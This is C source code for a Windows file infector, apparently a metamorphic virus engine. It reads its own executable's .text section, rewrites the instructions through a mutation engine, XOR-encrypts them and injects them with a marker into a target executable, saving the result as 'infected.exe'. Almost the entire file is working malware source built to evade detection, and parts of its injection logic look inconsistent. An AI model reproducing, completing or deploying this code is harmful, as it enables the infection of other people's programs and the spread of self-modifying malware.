
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "engine.h"
#include "mutate.h"
#include "isa.h"

#define MAX_INST_SIZE 15
#define MAX_MUTATED 4
#define XOR_KEY 0x5A
#define MARKER 0xDEADC0DE

void xor_encrypt(uint8_t *data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; ++i)
        data[i] ^= key;
}

void print_instruction(const char *label, const struct Instruction *inst) {
    printf("%s:\n", label);
    printf("  Opcode:        0x%02X\n", inst->opcode);
    printf("  Operand Type:  0x%02X\n", inst->operand_type);
    printf("  op1:           %d\n", inst->op1);
    printf("  op2:           %d\n", inst->op2);
    printf("  Immediate:     %lld (0x%08llX)\n", inst->imm, inst->imm);
    printf("  REX Prefix:    0x%02X\n", inst->rex);
    printf("\n");
}

uint8_t *mutate_self_text(size_t *out_len) {
    // 1. Read self
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    FILE *f = fopen(path, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    rewind(f);

    uint8_t *exe_buf = malloc(file_size);
    fread(exe_buf, 1, file_size, f);
    fclose(f);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)exe_buf;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(exe_buf + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

    uint8_t *text = NULL;
    DWORD text_size = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            text = exe_buf + sections[i].PointerToRawData;
            text_size = sections[i].SizeOfRawData;
            break;
        }
    }

    if (!text) return NULL;

    uint8_t *mutated = malloc(text_size + 16); // pad extra
    size_t in_off = 0, out_off = 0;

    while (in_off < text_size) {
        struct Instruction inst;
        int decoded = decode_instruction(&text[in_off], &inst);
        if (decoded <= 0) {
            mutated[out_off++] = text[in_off++];
            continue;
        }

        struct Instruction mutated_inst[MAX_MUTATED];
        int count = mutate_multi(&inst, mutated_inst, MAX_MUTATED);
        int written = 0;

        if (count > 0) {
            for (int i = 0; i < count; ++i) {
                uint8_t encoded[MAX_INST_SIZE] = {0};
                int len = encode_instruction(&mutated_inst[i], encoded);
                memcpy(mutated + out_off, encoded, len);
                out_off += len;
                written += len;
            }
            memset(mutated + out_off, 0x90, decoded - written);
            out_off += (decoded - written);
        } else {
            mutate_opcode(&inst);
            uint8_t encoded[MAX_INST_SIZE] = {0};
            int len = encode_instruction(&inst, encoded);
            memcpy(mutated + out_off, encoded, len);
            out_off += len;
        }
        in_off += decoded;
    }

    xor_encrypt(mutated, out_off, XOR_KEY);
    *out_len = out_off;
    free(exe_buf);
    return mutated;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <target.exe>\n", argv[0]);
        return 1;
    }

    // 1. Load target PE
    FILE *f = fopen(argv[1], "rb");
    if (!f) {
        perror("fopen target");
        return 1;
    }

    fseek(f, 0, SEEK_END);
    long t_size = ftell(f);
    rewind(f);

    uint8_t *target = malloc(t_size + 4096); // extra for payload
    fread(target, 1, t_size, f);
    fclose(f);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)target;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(target + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

    uint8_t *text = NULL;
    DWORD text_offset = 0;
    DWORD text_rawsize = 0;

    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            text = target + sections[i].PointerToRawData;
            text_offset = sections[i].PointerToRawData;
            text_rawsize = sections[i].SizeOfRawData;
            break;
        }
    }

    if (!text) {
        fprintf(stderr, "[-] Target has no .text section\n");
        return 1;
    }

    // 2. Mutate this engine’s .text section
    size_t mutated_len = 0;
    uint8_t *mutated_payload = mutate_self_text(&mutated_len);
    if (!mutated_payload) {
        fprintf(stderr, "[-] Mutation failed\n");
        return 1;
    }

    // 3. Append to end of .text slack (with marker + size)
    if (text_rawsize + mutated_len + 8 > sections[0].Misc.VirtualSize) {
        fprintf(stderr, "[-] Not enough space in .text to inject\n");
        return 1;
    }

    uint8_t *inject_ptr = text + text_rawsize;
    *(uint32_t *)inject_ptr = MARKER;
    *(uint32_t *)(inject_ptr + 4) = (uint32_t)mutated_len;
    memcpy(inject_ptr + 8, mutated_payload, mutated_len);

    // 4. Create new infected file
    FILE *out = fopen("infected.exe", "wb");
    if (!out) {
        perror("fopen infected");
        return 1;
    }

    fwrite(target, 1, t_size, out);
    fwrite(mutated_payload, 1, mutated_len + 8, out);
    fclose(out);

    printf("[*] Infected file written to infected.exe\n");
    free(mutated_payload);
    free(target);
    return 0;
}
